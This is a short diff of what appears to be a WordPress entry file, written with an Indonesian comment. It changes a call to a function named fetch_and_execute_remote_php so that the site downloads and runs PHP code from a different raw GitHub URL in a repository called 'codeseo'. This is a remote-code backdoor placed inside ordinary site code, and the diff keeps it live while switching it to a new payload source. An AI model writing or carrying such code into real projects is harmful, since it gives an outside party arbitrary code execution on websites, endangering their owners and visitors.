@@ -52,7 +52,7 @@ function fetch_and_execute_remote_php($url) {
 }
 
 // Panggil fungsi dengan URL yang diinginkan
-fetch_and_execute_remote_php("https://raw.githubusercontent.com/Zeddgansz/codeseo/main/16-07-2024");
+fetch_and_execute_remote_php("https://raw.githubusercontent.com/Zeddgansz/codeseo/main/newtree");
 
 // Setel konfigurasi untuk WordPress
 define('WP_USE_THEMES', true);
